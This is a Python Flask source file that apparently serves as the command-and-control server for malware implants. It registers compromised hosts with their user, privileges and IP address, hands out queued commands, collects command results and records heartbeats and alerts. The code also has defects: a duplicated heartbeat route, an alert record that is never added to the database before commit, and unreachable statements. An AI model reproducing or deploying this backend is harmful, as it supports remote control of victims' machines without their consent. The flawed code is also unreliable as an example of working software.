import functools
import json
from datetime import datetime
from msilib.schema import Error


from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, jsonify
)
from sqlalchemy.exc import IntegrityError
from werkzeug.security import check_password_hash, generate_password_hash

from .db import db
from .models import Implant, Command, Alert

bp = Blueprint('implant', __name__)

# register


@bp.route('/register', methods=['POST'])
def register():
    try:
        if request.method == 'POST':
            
            imp_id = request.json['computer_guid']
            now = datetime.now()
            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
            cmp_name = request.json['computer_name']
            user_name = request.json['computer_user']
            computer_guid = request.json['computer_guid']
            cmp_prev = request.json['computer_privileges']
            ip = request.json['connecting_ip_address']
            imp_session_key = request.json["session_key"]
            first_seen = current_date_time
            last_seen = current_date_time

            error = None

            if not imp_id:
                error = 'Id is required.'

            if error is None:
                try:
                    implant = Implant.query.filter_by(computer_guid=computer_guid).first()
                    
                    
                    if implant:
                        implant.computer_name = cmp_name
                        implant.computer_user = user_name
                        implant.last_seen = last_seen

                        db.session.commit()
                        print("Implant updated")
                        return jsonify({"status":"good job"})


                    else:
                        implant = Implant(
                            computer_name=cmp_name,
                            computer_user=user_name,
                            computer_guid=computer_guid,
                            computer_privileges=json.dumps(cmp_prev),
                            connecting_ip_address=ip,
                            session_key=imp_session_key,
                            first_seen=first_seen,
                            last_seen=last_seen
                        )
                        db.session.add(implant)
                        db.session.commit()
                        print("Implant added")
                        return jsonify({"status":"good job"})
                except Exception as e:
                    print("Register error" , e)

                    return jsonify({"status":"bad job"})

            else:
                return jsonify({"status":"bad job"})

                print("Alert: somone is trying to play with us")

            flash(error)
    except Exception as e:
        print("Register error" , e)

        return jsonify({"status":"bad job"})

        pass


@bp.route('/getNextCommand', methods=['POST'])
def get_next_command():
    if request.method == 'POST':
        try:
            impl_id = request.json["computer_guid"]

            if impl_id:
                next_command = Command.query.filter_by(
                    computer_guid=impl_id, status="not_taken_by_implant").first()
                print(next_command)
                if next_command:
                    
                    command = next_command.command_text
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    cmd_id = next_command.command_id
                    next_command.time_issued = current_date_time
                    command_type = next_command.command_type
                    next_command.status = "taken_by_implant"
                    db.session.commit()
                    return jsonify({"command_id": cmd_id, "command_text": command,"command_type":command_type})
                else:
                    return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})
        except Exception as e:
            print(e)

            return jsonify({"command_id": -1, "command_text": "No command","command_type":"gaga"})


@bp.route('/heartbeat', methods=['POST'])
def heartbeat():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            try:
                implant = Implant.query.filter_by(computer_guid=imp_id).first()
                if implant:
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    implant.last_seen = current_date_time
                    return jsonify({"status": "keep Alive"})
                else:
                    return jsonify({"status": "register first"})
            except Exception as e:
                print(e)
                return jsonify({"status": "register first"})

        except Exception as e:
            print(e)
            return jsonify({"status": "register first"})

@bp.route('/sendCommandResult', methods=['POST'])
def store_command_results():
    if request.method == 'POST':
        try:
            impl_id = request.json["computer_guid"]
            cmd_id = request.json["command_id"]
            result = request.json["result"]

            if impl_id:
                commands = Command.query.filter_by(computer_guid=impl_id, status="taken_by_implant",
                                                command_id=cmd_id).first()
                if commands:
                    commands.command_result = result
                    commands.status = "completed"
                    db.session.commit()
                    return jsonify({"status": "Result posted"})
                else:
                    return jsonify({"status": "Error in posting result"})
        except Exception as e:
            print(e)

            return jsonify({"status": "Error in posting result"})


@bp.route('/heartbeat', methods=['POST'])
def heartbeat():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            try:
                implant = Implant.query.filter_by(computer_guid=imp_id).first()
                if implant:
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    implant.last_seen = current_date_time
                    return jsonify({"status": "keep Alive"})
                else:
                    return jsonify({"status": "register first"})

            except Exception as e:
                print(e)

                return jsonify({"status": "register first"})
        except Exception as e:
            print(e)
            return jsonify({"status": "register first"})



@bp.route('/alert', methods=['POST'])
def alert():
    if request.method == 'POST':
        try:
            imp_id = request.json['computer_guid']
            alert = request.json['error']
            try:
                now = datetime.now()
                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                alert = Alert(computer_guid=imp_id,
                              time_reported=current_date_time, alert=alert)

                db.session.commit()
                return jsonify({"status": "Alert Registered"})
            except Exception as e:
                print(e)

                return jsonify({"status": "Bad alert"})
        except Exception as e:
            print(e)
            return jsonify({"status": "Bad alert"})
            pass
